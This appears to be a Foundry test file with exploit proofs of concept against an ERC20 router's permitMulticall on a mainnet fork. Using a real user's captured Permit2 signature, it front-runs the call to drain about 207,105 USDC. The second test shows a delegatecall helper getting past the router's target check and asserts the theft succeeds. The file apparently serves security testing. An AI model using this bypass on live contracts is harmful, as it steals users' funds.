   // SPDX-License-Identifier: UNLICENSED
   pragma solidity ^0.8.13;

   import {Test, console} from "forge-std/Test.sol";
   import {ERC20Router} from "../src/v1/ERC20RouterV1.sol";

   interface ISignatureTransfer {
       struct TokenPermissions {
           address token;
           uint256 amount;
       }
       struct PermitBatchTransferFrom {
           TokenPermissions[] permitted;
           uint256 nonce;
           uint256 deadline;
       }
       struct SignatureTransferDetails {
           address to;
           uint256 requestedAmount;
       }
   }

   interface IERC20 {
       function balanceOf(address account) external view returns (uint256);
       function approve(address spender, uint256 amount) external returns (bool);
   }

   interface IERC20Router {
       function permitMulticall(
           address user,
           ISignatureTransfer.PermitBatchTransferFrom memory permit,
           address[] calldata targets,
           bytes[] calldata datas,
           uint256[] calldata values,
           address refundTo,
           bytes memory permitSignature
       ) external payable returns (bytes[] memory);
   }

   contract Permit2 is Test {

        error InvalidTarget(address target);

        address router = 0xeeeeee9eC4769A09a76A83C7bC42b185872860eE;
        address permit2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        string public constant _RELAYER_WITNESS_TYPE_STRING = "RelayerWitness witness)RelayerWitness(address relayer)TokenPermissions(address token,uint256 amount)";

        function testFrontrunPermitMulticall() public {
            address targetUser = 0xf70da97812CB96acDF810712Aa562db8dfA3dbEF;
            bytes32 witness = 0x9188754b7e7c994c372c19d5e2c80fc39b00ab562e99b379d948bf7b1e8b94c1;
            bytes memory permitSignature = hex"d4215350b9d1593dd2d5c0ed34d7242a05e3723c38d7517253c04d083be9877d443cea0198e18059116ff2322c4b0abbcd9a43a4f569acb206568a1a3c9ac9a51b";
            uint256 nonce = 95289913598757;
            uint256 deadline = 1748611956;
            uint256 amount = 207105292484; // 207,105 USDC (6 decimals)

            vm.createSelectFork(vm.rpcUrl("mainnet"), 22382180);

            ERC20Router erc20Router = new ERC20Router(permit2);
            vm.etch(router, address(erc20Router).code);

            address attacker = makeAddr("attacker");
            vm.deal(attacker, 1 ether);
            vm.startPrank(attacker);

            ISignatureTransfer.TokenPermissions[] memory permitted = new ISignatureTransfer.TokenPermissions[](1);
            permitted[0] = ISignatureTransfer.TokenPermissions({ token: usdc, amount: amount });

            ISignatureTransfer.PermitBatchTransferFrom memory permit = ISignatureTransfer.PermitBatchTransferFrom({
                permitted: permitted,
                nonce: nonce,
                deadline: deadline
            });

            ISignatureTransfer.SignatureTransferDetails[] memory signatureTransferDetails = new ISignatureTransfer.SignatureTransferDetails[](1);
            signatureTransferDetails[0] = ISignatureTransfer.SignatureTransferDetails({
                to: router,
                requestedAmount: amount
            });

            address[] memory targets = new address[](2);
            targets[0] = permit2;
            targets[1] = usdc;

            bytes[] memory datas = new bytes[](2);
            datas[0] = abi.encodeWithSelector(
                0xfe8ec1a7, // selector of permit2.permitWitnessTransferFrom
                permit,
                signatureTransferDetails,
                targetUser,
                witness,
                _RELAYER_WITNESS_TYPE_STRING,
                permitSignature
            );
            datas[1] = abi.encodeWithSignature(
                "transfer(address,uint256)",
                attacker,
                amount
            );

            uint256[] memory values = new uint256[](2);

            vm.expectRevert(abi.encodeWithSelector(InvalidTarget.selector, permit2));
            IERC20Router(router).permitMulticall(
                attacker,
                permit,
                targets,
                datas,
                values,
                address(0),
                bytes("") // empty permitSignature to skip _handlePermitBatch
            );

            vm.stopPrank();
            console.log("attacker USDC balance: %s", IERC20(usdc).balanceOf(attacker));
        }

        function testFrontrunDelegatecallPermitMulticall() public {
            address targetUser = 0xf70da97812CB96acDF810712Aa562db8dfA3dbEF;
            bytes32 witness = 0x9188754b7e7c994c372c19d5e2c80fc39b00ab562e99b379d948bf7b1e8b94c1;
            bytes memory permitSignature = hex"d4215350b9d1593dd2d5c0ed34d7242a05e3723c38d7517253c04d083be9877d443cea0198e18059116ff2322c4b0abbcd9a43a4f569acb206568a1a3c9ac9a51b";
            uint256 nonce = 95289913598757;
            uint256 deadline = 1748611956;
            uint256 amount = 207105292484; // 207,105 USDC (6 decimals)

            vm.createSelectFork(vm.rpcUrl("mainnet"), 22382180);

            ERC20Router erc20Router = new ERC20Router(permit2);
            vm.etch(router, address(erc20Router).code);

            vm.startPrank(targetUser);
            IERC20(usdc).approve(permit2, type(uint256).max);
            vm.stopPrank();

            address attacker = makeAddr("attacker");
            vm.deal(attacker, 1 ether);
            vm.startPrank(attacker);

            DelegatecallPermit2 delegatecallPermit2 = new DelegatecallPermit2(permit2);
            
            ISignatureTransfer.TokenPermissions[] memory permitted = new ISignatureTransfer.TokenPermissions[](1);
            permitted[0] = ISignatureTransfer.TokenPermissions({ token: usdc, amount: amount });

            ISignatureTransfer.PermitBatchTransferFrom memory permit = ISignatureTransfer.PermitBatchTransferFrom({
                permitted: permitted,
                nonce: nonce,
                deadline: deadline
            });

            ISignatureTransfer.SignatureTransferDetails[] memory signatureTransferDetails = new ISignatureTransfer.SignatureTransferDetails[](1);
            signatureTransferDetails[0] = ISignatureTransfer.SignatureTransferDetails({
                to: router,
                requestedAmount: amount
            });

            address[] memory targets = new address[](2);
            targets[0] = address(delegatecallPermit2);
            targets[1] = usdc;

            bytes[] memory datas = new bytes[](2);
            datas[0] = abi.encodeWithSelector(
                0xfe8ec1a7, // selector of permit2.permitWitnessTransferFrom
                permit,
                signatureTransferDetails,
                targetUser,
                witness,
                _RELAYER_WITNESS_TYPE_STRING,
                permitSignature
            );
            datas[1] = abi.encodeWithSignature(
                "transfer(address,uint256)",
                attacker,
                amount
            );

            uint256[] memory values = new uint256[](2);

            IERC20Router(router).permitMulticall(
                attacker,
                permit,
                targets,
                datas,
                values,
                address(0),
                bytes("") // empty permitSignature to skip _handlePermitBatch
            );

            vm.stopPrank();

            assertEq(IERC20(usdc).balanceOf(attacker), amount);
            console.log("attacker USDC balance: %s", IERC20(usdc).balanceOf(attacker));
        }
    }

    contract DelegatecallPermit2 {
        address permit2;

        constructor(address _permit2) {
            permit2 = _permit2;
        }

        fallback() external {
            (bool success, bytes memory data) = permit2.delegatecall(msg.data);
        }
    }